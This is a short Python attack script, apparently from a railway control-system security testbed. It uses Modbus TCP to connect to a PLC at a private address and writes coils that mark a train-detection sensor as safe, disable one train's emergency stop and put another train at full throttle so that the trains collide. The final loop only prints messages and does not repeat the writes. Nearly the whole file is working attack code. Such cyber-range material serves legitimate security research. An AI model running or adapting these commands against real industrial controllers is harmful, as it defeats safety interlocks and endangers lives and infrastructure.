#-----------------------------------------------------------------------------
# Name:        false command injector.py
#
# Purpose:     a false command jection attack program to send the false train
#              detect sensor off and then control the train to collision.
#
# Author:      Yuancheng Liu
#
# Created:     2023/10/02
# Version:     v_0.1
# Copyright:   
# License:     
#-----------------------------------------------------------------------------


import time
import modbusTcpCom

hostIp = '10.107.105.7'
hostPort = 502

client = modbusTcpCom.modbusTcpClient(hostIp)
print('Try to connect to the target victim PLC: %s' %str(hostIp))

while not client.checkConn():
    print('try connect to the PLC')
    print(client.getCoilsBits(0, 4))
    time.sleep(0.5)

print('Target PLC accept connection request.')
time.sleep(1)
print('Inject front train detection sensor holding register safe [hr10 val=0]  for  train-we0...')
client.setCoilsBit(10, False)
time.sleep(1)
print("Inject train train-we1 emmergency stop [coil val=0] .")
client.setCoilsBit(1, False)
print("Inject train train-we0 power full trottle [coil val=1] ...")
client.setCoilsBit(0, True)
while True:
    print('Inject front train detection sensor holding register safe [hr10 val=0]  for  train-we0...')
    time.sleep(1)
    print("Inject train train-we1 emmergency stop [coil val=0] .")
    time.sleep(1)
    print("Inject train train-we0 power full trottle [coil val=1] ...")
